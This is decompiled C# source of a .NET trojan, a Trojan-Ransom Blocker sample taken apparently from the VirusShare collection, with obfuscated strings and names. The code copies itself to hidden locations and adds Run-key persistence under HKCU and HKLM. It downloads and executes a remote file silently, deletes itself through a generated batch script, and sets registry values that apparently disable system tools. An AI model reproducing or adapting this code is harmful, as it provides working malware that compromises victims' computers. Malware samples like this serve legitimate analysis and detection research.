// Decompiled with JetBrains decompiler
// Type: ?1?.?7?
// Assembly: tutzutzutz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 24544FBB-E29C-4CD0-A180-E0F7591B8C92
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.hela-60428f68afac01b391496fe7183b4795cc29d1e6528c4ef1f2dec9ea939ee5e7.exe

using \u003F1\u003F;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace \u003F1\u003F
{
  internal class \u003F7\u003F
  {
    private Mutex zMutex;

    public void \u003F30\u003F()
    {
      this.\u003F31\u003F();
      this.\u003F37\u003F();
      this.\u003F32\u003F();
    }

    private void \u003F31\u003F()
    {
      try
      {
        this.zMutex = new Mutex(true, \u003F4\u003F.ConfigClass.tzirtzurtzurzru);
        this.zMutex.ReleaseMutex();
      }
      catch
      {
        Environment.Exit(-1);
      }
    }

    private void \u003F32\u003F()
    {
      string fileName = Process.GetCurrentProcess().MainModule.FileName;
      if (this.\u003F35\u003F())
        return;
      try
      {
        foreach (string str in \u003F4\u003F.ConfigClass.zurtzuerthtr)
        {
          if (!\u003F4\u003F.FunctionClass.\u003F21\u003F(str))
            System.IO.File.Copy(fileName, str);
          System.IO.File.SetAttributes(str, FileAttributes.Hidden);
        }
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003F75\u003F.\u003F76\u003F("~Ńɍ͞ўՉٕ݃\u0879३\u0A4Aୁ\u0C53\u0D4F\u0E6Cཱၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯\u247B╻♮❩⡫⥘⩑⭷Ɐ"), true).SetValue(\u003F4\u003F.ConfigClass.bncbncvbcvbn[0], (object) ('"'.ToString() + \u003F4\u003F.ConfigClass.zurtzuerthtr[0] + (object) '"'));
        Registry.LocalMachine.OpenSubKey(\u003F75\u003F.\u003F76\u003F("~Ńɍ͞ўՉٕ݃\u0879३\u0A4Aୁ\u0C53\u0D4F\u0E6Cཱၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯\u247B╻♮❩⡫⥘⩑⭷Ɐ"), true).SetValue(\u003F4\u003F.ConfigClass.bncbncvbcvbn[1], (object) ('"'.ToString() + \u003F4\u003F.ConfigClass.zurtzuerthtr[1] + (object) '"'));
      }
      catch
      {
      }
      try
      {
        this.zMutex.Close();
        foreach (string str in \u003F4\u003F.ConfigClass.zurtzuerthtr)
          new Process()
          {
            StartInfo = {
              FileName = str,
              WindowStyle = ProcessWindowStyle.Hidden
            }
          }.Start();
      }
      catch
      {
      }
      Environment.Exit(-1);
    }

    public void \u003F33\u003F(string _param1)
    {
      try
      {
        this.zMutex.Close();
      }
      catch
      {
      }
      try
      {
        string str = \u003F4\u003F.FunctionClass.\u003F20\u003F(new Random().Next(5, 12)) + \u003F75\u003F.\u003F76\u003F("*Ŧɺͤ");
        new WebClient().DownloadFile(_param1, Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("]") + str);
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("]") + str),
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
      }
      catch
      {
      }
      this.\u003F36\u003F();
      Environment.Exit(-1);
    }

    public void \u003F34\u003F()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003F75\u003F.\u003F76\u003F("~Ńɍ͞ўՉٕ݃\u0879३\u0A4Aୁ\u0C53\u0D4F\u0E6Cཱၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯\u247B╻♮❩⡫⥘⩑⭷Ɐ"), true).DeleteValue(\u003F4\u003F.ConfigClass.bncbncvbcvbn[0]);
        Registry.LocalMachine.OpenSubKey(\u003F75\u003F.\u003F76\u003F("~Ńɍ͞ўՉٕ݃\u0879३\u0A4Aୁ\u0C53\u0D4F\u0E6Cཱၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯\u247B╻♮❩⡫⥘⩑⭷Ɐ"), true).DeleteValue(\u003F4\u003F.ConfigClass.bncbncvbcvbn[1]);
      }
      catch
      {
      }
      try
      {
        foreach (string path in \u003F4\u003F.ConfigClass.zurtzuerthtr)
          System.IO.File.Delete(path);
      }
      catch
      {
      }
      this.\u003F36\u003F();
      Environment.Exit(-1);
    }

    private bool \u003F35\u003F()
    {
      string[] zurtzuerthtr = \u003F4\u003F.ConfigClass.zurtzuerthtr;
      int index = 0;
      if (index < zurtzuerthtr.Length)
      {
        string str = zurtzuerthtr[index];
        if (!\u003F4\u003F.FunctionClass.\u003F21\u003F(str))
          return false;
      }
      return true;
    }

    private void \u003F36\u003F()
    {
      try
      {
        string str = \u003F75\u003F.\u003F76\u003F("2ŕɖ̏Ѡզٮܡ") + (object) '"' + Environment.GetCommandLineArgs()[0] + (object) '"' + \u003F75\u003F.\u003F76\u003F("\0Šɮ̧ѣս٭ݰ\u0876ड") + (object) '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + (object) '"' + \u003F75\u003F.\u003F76\u003F("(Šɩͱѫԣِݑ");
        TextWriter textWriter = (TextWriter) new StreamWriter(Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("WŮɬͤѢղ٠ܪ\u0861ॣੵ"));
        textWriter.WriteLine(str);
        textWriter.Close();
        new Process()
        {
          StartInfo = {
            FileName = (Environment.GetEnvironmentVariable(\u003F75\u003F.\u003F76\u003F("Pņɏ͑")) + \u003F75\u003F.\u003F76\u003F("WŮɬͤѢղ٠ܪ\u0861ॣੵ")),
            UseShellExecute = false,
            CreateNoWindow = true
          }
        }.Start();
      }
      catch
      {
      }
    }

    private void \u003F37\u003F()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003F75\u003F.\u003F76\u003F("hŕɟ͌р\u0557هݑ\u086Fॿ\u0A58\u0B53\u0C5Dു\u0E5Eགྷ၍ᅞት\u137Fᑎᕈᙁᝋᡔᥑ\u1A7D᭣ᱪᵬṯό\u2075Ⅾ≏⍽\u2465╥♼\u277B⡽⥎⩔⭨Ɀⵢ\u2E62⽾のㅸ\u3255㍉㑣㕰㙤㝪㡠㥧㩥"), true).SetValue(\u003F75\u003F.\u003F76\u003F("NŬɠͧѧկ"), (object) \u003F75\u003F.\u003F76\u003F("3"), RegistryValueKind.DWord);
      }
      catch
      {
      }
      if (!\u003F4\u003F.ConfigClass.fgbvnmvbmnm)
        return;
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003F75\u003F.\u003F76\u003F("hŕɟ͌р\u0557هݑ\u086Fॿ\u0A58\u0B53\u0C5Dു\u0E5Eགྷ၍ᅞት\u137Fᑎᕈᙁᝋᡔᥑ\u1A7D᭣ᱪᵬṯό\u2075Ⅾ≏⍽\u2465╥♼\u277B⡽⥎⩔⭨Ɀⵢ\u2E62⽾のㅸ\u3255㍉㑣㕰㙤㝪㡠㥧㩥"), true).SetValue(\u003F75\u003F.\u003F76\u003F("Tžɮͬѡթىݫ\u0865।੨୩౫\u0D50\u0E6Aིၲ"), (object) \u003F75\u003F.\u003F76\u003F("1"), RegistryValueKind.DWord);
      }
      catch
      {
      }
      try
      {
        Registry.CurrentUser.OpenSubKey(\u003F75\u003F.\u003F76\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F75\u003F.\u003F76\u003F("LŦɦͤѩաُݗࡀ"), (object) \u003F75\u003F.\u003F76\u003F("1"), RegistryValueKind.DWord);
        Registry.LocalMachine.OpenSubKey(\u003F75\u003F.\u003F76\u003F("jŗɑ͂тՕفݗ\u086Dॽ\u0A46୍\u0C5Fൃ๘ཅ၏ᅜቻ\u1371ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1F7F\u2077Ⅼ≁⍳\u2467╧♺\u277D⡿⥌⩟⭡ⱡⵥ\u2E68⽣ぬㅻ\u325B㍕㑼㕷㙷㝧㡬"), true).SetValue(\u003F75\u003F.\u003F76\u003F("LŦɦͤѩաُݗࡀ"), (object) \u003F75\u003F.\u003F76\u003F("1"), RegistryValueKind.DWord);
      }
      catch
      {
      }
    }
  }
}
